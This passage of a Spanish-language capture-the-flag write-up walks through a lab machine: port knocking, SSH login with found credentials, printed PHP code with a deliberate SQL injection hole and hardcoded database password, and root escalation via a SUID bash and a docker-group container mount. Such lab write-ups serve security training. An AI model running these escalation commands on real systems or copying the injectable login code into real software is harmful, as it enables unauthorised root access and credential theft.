```bash
python knockit.py 192.168.100.90 8745 9467 1739

******************************************************
*                                                    *
*  _  __                     _     _____  _          *
* | |/ /                    | |   |_   _|| |         *
* | ' /  _ __    ___    ___ | | __  | |  | |_        *
* |  <  | '_ \  / _ \  / __|| |/ /  | |  | __|       *
* | . \ | | | || (_) || (__ |   <  _| |_ | |_        *
* |_|\_\|_| |_| \___/  \___||_|\_\|_____| \__|       *
*                                                    *
*                                                    *
* KnockIt v1.0                                       *
* Coded by thebish0p                                 *
* https://github.com/thebish0p/                      *
******************************************************

[+] Knocking on port 192.168.100.90:8745
[+] Knocking on port 192.168.100.90:9467
[+] Knocking on port 192.168.100.90:1739
```

Y lo comprobamos con **nmap**:
```bash
nmap -p 22 -sCV 192.168.100.90
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 18:21 CST
Nmap scan report for budasec.thl (192.168.100.90)
Host is up (0.00100s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 5e:7a:33:3e:a4:41:3c:4b:4e:cc:9e:3c:ce:6e:86:b2 (ECDSA)
|_  256 8e:56:95:61:f5:77:4e:17:37:29:35:0f:a7:33:98:1a (ED25519)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.44 seconds
```

Comprobemos si sirven las credenciales que encontramos en este servicio:
```bash
ssh yolanda@192.168.100.90
yolanda@192.168.100.90's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)
...
Last login: Fri Jun  7 16:00:19 2024
-bash-5.1$ whoami
yolanda
```
Estamos dentro.

Aquí encontraremos la flag del usuario:
```bash
-bash-5.1$ ls
user.txt
-bash-5.1$ cat user.txt
...
```

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima {#linEnum}

En el directorio `/var/www/html` encontraremos los archivos de la página web:
```bash
-bash-5.1$ ls -la /var/www/html/
total 32
drwxr-xr-x 3 root     root      4096 Jun  6  2024 .
drwxr-xr-x 3 root     root      4096 Apr 30  2024 ..
-rw-r--r-- 1 root     root     10671 Apr 30  2024 index.html
-rw-r--r-- 1 root     root       487 Apr 30  2024 mysql-connector-python.py
-rw-r--r-- 1 root     root        33 Apr 30  2024 robots.txt
drwxr-xr-x 7 www-data www-data  4096 May  1  2024 xyprob
```

Si revisamos ese archivo **mysql-connector-python.py**, veremos las credenciales de acceso a la BD **ctf_db**:
```bash
-bash-5.1$ cat mysql-connector-python.py
import mysql.connector

# Conexión a la base de datos
db_connection = mysql.connector.connect(
    host="localhost",
    user="root",
    password="",
    database="ctf_db"
)

# Crear un cursor para ejecutar consultas SQL
cursor = db_connection.cursor()

# Ejecutar una consulta SQL (ejemplo)
cursor.execute("SELECT * FROM users WHERE username = 'nombre_usuario' AND password = 'contraseña'")

# Obtener resultados
results = cursor.fetchall()

# Cerrar conexión
db_connection.close()
```
Pero esta BD no la vimos cuando dumpeamos las BDs existentes con **SQLMAP**.

Dentro del directorio `xyprob/12356723/`, encontraremos el script del login que encontramos en el subdominio:
```bash
-bash-5.1$ cat dev.php 
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$host = 'localhost';
$username = 'root';
$password = 'r@@t123#$!';
$database = 'buda';

// Conexión a la base de datos
$conn = new mysqli($host, $username, $password, $database);

// Verificar la conexión
if ($conn->connect_error) {
    die("Error de conexión: " . $conn->connect_error);
}

// Verificar si se ha enviado el formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Construir la consulta SQL para seleccionar el usuario y la contraseña encriptada
    $query = "SELECT * FROM users WHERE username = '$username'";

    // Ejecutar consulta para el usuario
    $result = $conn->query($query);

    // Verificar si el usuario existe y si la contraseña es correcta
    if ($result && $result->num_rows > 0) {
        // Obtener la fila del usuario
        $row = $result->fetch_assoc();
        
        // Verificar si la contraseña es correcta utilizando password_verify()
        if (password_verify($password, $row['hashed_password'])) {
            // Contraseña correcta, mostrar mensaje de error
            echo "Login failed";
        } else {
            // Contraseña incorrecta, mostrar mensaje de error
            echo "Credenciales incorrectas.";
        }
    } else {
        // Si llegamos aquí, el usuario no existe
        echo "Credenciales incorrectas.";
    }
}
?>

<html>
<body>
    ### Login
    <form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>">
        Usuario: <input type="text" name="username"><br>
        Contraseña: <input type="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
```
Observa que ahí están las credenciales de acceso para la **BD buda**.

Ahí vemos varias cosas:
* La consulta toma en cuenta el campo del usuario sin aplicar ningún filtro, siendo aquí donde aplicamos las **Inyecciones SQL**.
* Se aplica una verificación de usuario que, de no existir dentro de la BD, nos da el error **"Credenciales incorrectas."**.
* En caso de que hayamos ingresado las credenciales correctas, nos da el mensaje **"Login Failed"**.

Veamos qué usuarios existen:
```bash
-bash-5.1$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
chaska:x:1000:1000:chaska:/home/chaska:/bin/bash
ftpuser:x:1001:1001:,,,:/home/ftpuser:/bin/bash
yolanda:x:1002:1002:,,,:/home/yolanda:/bin/bash
```
Aparte de los que ya conocemos, vemos al **usuario chaska**.

Revisando el directorio `/home`, solo tendremos acceso al directorio de nuestro usuario:
```bash
-bash-5.1$ ls -la /home
total 20
drwxr-xr-x  5 root    root    4096 Jun  6  2024 .
drwxr-xr-x 20 root    root    4096 Apr 30  2024 ..
drwxr-x---  5 chaska  chaska  4096 Jun  7  2024 chaska
dr-xr-x---  3 ftpuser ftpuser 4096 Jun  7  2024 ftpuser
drwxr-x---  4 yolanda yolanda 4096 Sep  9 00:46 yolanda
```

Revisemos si existe algún binario con **permisos SUID**:
```bash
-bash-5.1$ find / -perm -4000 2>/dev/null
/snap/snapd/21759/usr/lib/snapd/snap-confine
/snap/core20/2318/usr/bin/chfn
/snap/core20/2318/usr/bin/chsh
/snap/core20/2318/usr/bin/gpasswd
/snap/core20/2318/usr/bin/mount
/snap/core20/2318/usr/bin/newgrp
/snap/core20/2318/usr/bin/passwd
/snap/core20/2318/usr/bin/su
/snap/core20/2318/usr/bin/sudo
/snap/core20/2318/usr/bin/umount
/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2318/usr/lib/openssh/ssh-keysign
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/fusermount3
/usr/bin/chfn
/usr/bin/mount
/usr/bin/umount
/usr/bin/su
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/bash
/usr/bin/passwd
```
Curiosamente, ahí está la **bash** con **permisos SUID**.

Entonces, solo tenemos que ejecutar la **Bash** con privilegios:
```bash
-bash-5.1$ bash -p
bash-5.1# whoami
root
```
Y somos **Root**.

### Abusando de Grupo Docker para Escalar Privilegios {#Docker}

Digamos que la **Bash** no tenía **permisos SUID**.

Veamos si nuestro usuario tiene privilegios:
```bash
-bash-5.1$ sudo -l
[sudo] password for yolanda: 
Sorry, user yolanda may not run sudo on buda.
```
No tiene ninguno.

Ahora veamos a qué grupos pertenece este usuario:
```bash
-bash-5.1$ id
uid=1002(yolanda) gid=1002(yolanda) groups=1002(yolanda),123(docker)
```
Estamos en el **grupo Docker**, entonces es posible que podamos escalar privilegios.

En la **guía de GTFOBins** encontraremos una forma de crear un contenedor de la raíz de la máquina, al que cualquier cambio que le hagamos, se verá reflejado en la máquina:
* <a href="https://gtfobins.github.io/gtfobins/docker/" target="_blank">GTFOBins: docker</a>

Pero necesitaremos tener internet en la máquina víctima o debemos pasarle la imagen de **Alpine**, para que pueda crear el contenedor de la máquina víctima.

Usaremos este comando:

<p align="center">
<img src="/assets/images/THL-writeup-buda/Captura9.png">
</p>

Antes de aplicarlo, veamos qué permisos tiene la **Bash**:
```bash
-bash-5.1$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Ahora sí, apliquémoslo:
```bash
-bash-5.1$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
9824c27679d3: Pull complete 
Digest: sha256:4bcff63911fcb4448bd4fdacec207030997caf25e9bea4045fa6c8c44de311d1
Status: Downloaded newer image for alpine:latest
root@4d640ed25840:/#
```

Démosle **permisos SUID** a la **Bash**:
```bash
root@4d640ed25840:/# chmod u+s /bin/bash
root@4d640ed25840:/# ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```
Ya están asignados.

Salgamos del contenedor y revisemos los permisos de la **Bash** de nuevo:
```bash
-bash-5.1$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```
Ahí están los **permisos SUID**.

Ejecuta la **Bash** con privilegios:
```bash
-bash-5.1$ bash -p
bash-5.1# whoami
root
```
Somos **Root**.

Obtengamos la última flag:
```bash
bash-5.1# cd /root
bash-5.1# ls
root.txt  snap
bash-5.1# cat root.txt
...
```
Y con esto, terminamos la máquina.
